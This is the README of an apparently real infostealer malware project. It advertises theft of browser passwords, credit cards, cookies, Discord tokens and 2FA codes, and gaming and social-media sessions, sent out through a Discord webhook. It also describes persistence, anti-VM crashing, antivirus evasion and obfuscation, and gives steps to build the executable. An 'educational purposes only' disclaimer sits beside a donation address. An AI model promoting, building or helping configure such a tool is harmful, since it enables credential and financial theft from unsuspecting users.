<div align="center">
    <h1>Yuuto's Stealer</h1>
    <h6>A stealer made by <a href="https://github.com/JustYuuto">Yuuto</a></h6>
    <a href="https://github.com/JustYuuto/Yuuto-Stealer/issues">
        <img alt="GitHub issues" src="https://img.shields.io/github/issues/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    </a>
    <img alt="Lines of code" src="https://img.shields.io/tokei/lines/github/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    <img alt="GitHub code size in bytes" src="https://img.shields.io/github/repo-size/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    <a href="https://github.com/JustYuuto/Yuuto-Stealer/wiki">
        <img alt="Read Docs" src="https://img.shields.io/badge/Read-Docs-blue?style=for-the-badge">
    </a>
</div>

--------------------------

## Functionalities

Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities).

* Made for Windows, but might work on macOS and Linux with Wine
* Zero VirusTotal detections
* Easy to build
* Can add itself to startup programs
* Can get IP info
* Can get OS info: RAM, OS version, computer name...
* Can get Windows product key
* Can kill Discord processes
* Can get Chrome-based browsers logins and passwords, credit cards, cookies, history
* Can steal Twitter, Reddit and Minecraft session, Roblox login cookie
* Can trigger a BSOD if the grabber is run from a virtual machine
* Can steal Discord token, 2FA backup codes

Everything is sent through a Discord Webhook.

## Screenshots

![Webhook](screenshots/webhook.png)

Webhook

## Using it

### Requirements

To use and build this grabber, you'll need to download these things:

* [Node.js](https://nodejs.org/en)
* Minimum knowledge in using JavaScript objects, booleans and strings

### Getting the code

[Download zip](https://github.com/JustYuuto/Yuuto-Stealer/archive/refs/heads/master.zip) and extract it.

### Configuration

Some things need to be configured (in the [`config.js`](config.js) file) before building the executable, like the webhook URL. If you don't know how to create a webhook, [you can learn it](https://support.discord.com/hc/en-us/articles/228383668). You can [click here](https://github.com/JustYuuto/Grabber/wiki/Configuration) for documentation about configuration items.

### Building the executable

After configuring the grabber, we can finally build its executable! Run the following command in the project folder:

```bash
npm install # To install modules
node build.js
```

**What is going on after running the command**:
* Build the icon into a ``.ico`` file
* Build the executable which will:
  * Run webpack for minification and obfuscation
  * Run Electron builder for building the executable

The executable can be found at ``dist/<exe name provided in the config>.exe``.

## Todo

See [TODO.md](TODO.md) file.

## Responsibility

I, Yuuto, and other contributors, will not accept any responsibility case for damage done using this tool. This was made for educational and demonstration purposes only.

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=JustYuuto/Yuuto-Stealer&type=Date)](https://star-history.com/#JustYuuto/Yuuto-Stealer&Date)

## Donating

If you find this project useful, consider donating:

* Ethereum Address : 0xf27851244c96d70b363c7641b99a2ee8ca818ba5
